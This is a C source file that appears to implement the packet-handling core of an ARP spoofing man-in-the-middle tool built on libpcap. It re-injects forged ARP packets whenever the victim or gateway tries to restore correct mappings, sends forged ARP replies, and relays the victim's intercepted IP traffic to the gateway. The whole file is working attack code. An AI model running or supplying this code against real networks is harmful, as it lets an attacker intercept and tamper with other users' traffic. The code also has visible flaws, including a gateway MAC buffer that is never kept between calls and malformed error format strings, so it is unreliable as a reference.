#include "packet_handle.h"
#include "packet_header.h"
#include "packet_detail.h"

#include <stdint.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <pcap.h>
#include <net/if.h>

void get_info(char* device,int num, Session* session)
{
    switch(num)
    {
        case 1:
           my_mac(device);
           break;
        case 2:
           my_ip(device);
           break;
        case 3:
           gate_mac(session);
           break;
        default:
           break;
    }
}

int get_packet(int size, const uint8_t* packet, Session* session, pcap_t* handle)
{
    ETHER_HDR* get_eth=NULL;
    ARP_HDR* get_arp=NULL;
    IPV4_HDR* get_ip=NULL;
    uint8_t broad[6]={0x00,0x00,0x00,0x00,0x00,0x00};
    uint8_t gateMac[6];
    uint8_t relay_pkt[BUFSIZ];

    get_eth = (ETHER_HDR *)packet;
    get_ip=(IPV4_HDR*)(packet+sizeof(ETHER_HDR));

    if(ntohs(get_eth->eth_type) == 0x0806 )
    {
        //arp header
        get_arp=(ARP_HDR*)(packet + sizeof(ETHER_HDR));

        if(ntohs(get_arp->opcode)==0x0001)
        {
            /*
             * <recovery condition
             *  1. sender send arp reqeust(broadcast)
             *  2. external send arp request for host scan
             */
            for(int i=0; i< session->session_count; i++)
            {
                //1. from sender to gateway
                if(((get_arp->sender_ipaddr==session[i].sender_ip) && (get_arp->target_ipaddr==session[i].target_ip)) /*&& ((memcmp(get_arp->target_macaddr,broad,6)==0) )*/)
                {
                    printf("ARP request packet from sender to gateway!!!!\n");
                    printf("ARP re-injection!!!\n\n");
                    if (pcap_sendpacket(handle, session[i].senderpacket, sizeof(ARP_PKT) /* size */ ) != 0 )
                    {
                        fprintf(stderr,"=================request packet from sender to gateway================\n");
                        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                        return -1;
                    }
                }

                if(((get_arp->sender_ipaddr==session[i].target_ip) && (get_arp->target_ipaddr==session[i].sender_ip))/* && ((memcmp(get_arp->target_macaddr,broad,6)==0) )*/)
                {
                    printf("ARP request packet from gateway to sender!!!!\n");
                    printf("ARP re-injection!!!\n\n");
                    if (pcap_sendpacket(handle, session[i].senderpacket, sizeof(ARP_PKT) /* size */ ) != 0 )
                    {
                        fprintf(stderr,"=================request packet from gateway to sender================\n");
                        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                        return -1;
                    }
                }
            }

        }
        else if(ntohs(get_arp->opcode)==0x0002) //for find target mac_addr
        {
            for(int i=0; i< session->session_count; i++)
            {
               // debuging
               // printf("%x\n",get_arp->sender_ipaddr);
               // printf("%x\n",session->target_ip);

                if(get_arp->sender_ipaddr!=session->target_ip)
                {
                    if ((get_arp->sender_ipaddr==arp_req[i].arp.target_ipaddr) && memcmp(get_arp->target_macaddr,arp_req->arp.sender_macaddr,6)==0)
                    {
                        // for debuging
                        // printf("%x %x %x %x %x %x\n",get_arp->sender_macaddr[0],get_arp->sender_macaddr[1],get_arp->sender_macaddr[2],get_arp->sender_macaddr[3],get_arp->sender_macaddr[4],get_arp->sender_macaddr[5]);
                        memcpy(arp_rpy[i].arp.target_macaddr,get_arp->sender_macaddr,6);

                        //1. make_reply_pakcet
                        make_arp_packet(session,3,i);

                        //2. send_reply_packet
                        printf("ARP reply pkt for injection!!\n");
                        if (pcap_sendpacket(handle, session[i].senderpacket, sizeof(ARP_PKT) /* size */ ) != 0 )
                        {
                            fprintf(stderr,"=================find target mac================\n");

                            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                            return -1;
                        }
                    }
                }
                else if(get_arp->sender_ipaddr==session->target_ip && memcmp(get_arp->target_macaddr,MY_MAC,6)==0)
                {
                    //find gateway mac
                    memcpy(gateMac,get_eth->eth_src,6);
                }
            }
        }
    }
    //ip packet
    else if(ntohs(get_eth->eth_type) == 0x0800)
    {
        // condition
        // 1. ip.src is sender ip?
        // 2. eth.src is sender mac?

        for(int i=0; i< session->session_count; i++)
        {
            if(get_ip->ip_srcaddr==session[i].sender_ip && memcmp(get_eth->eth_src,arp_rpy->arp.target_macaddr,6)==0 && memcmp(get_eth->eth_dst,MY_MAC,6)==0 )
            {
                //forwarding ip relay pkt
                memcpy(relay_pkt,packet,(size_t)size);
                memcpy(relay_pkt,gateMac,6);
                memcpy(relay_pkt+6,MY_MAC,6);

                printf("IP Packt relay!!!\n");
                if (pcap_sendpacket(handle, relay_pkt, size /* size */ ) != 0 )
                {
                    fprintf(stderr,"=================relay packt================\n");

                    fprintf(stderr,"\nError 22sending the packet: \n", pcap_geterr(handle));
                    return -1;
                }
            }
        }
    }

    return 0;
}





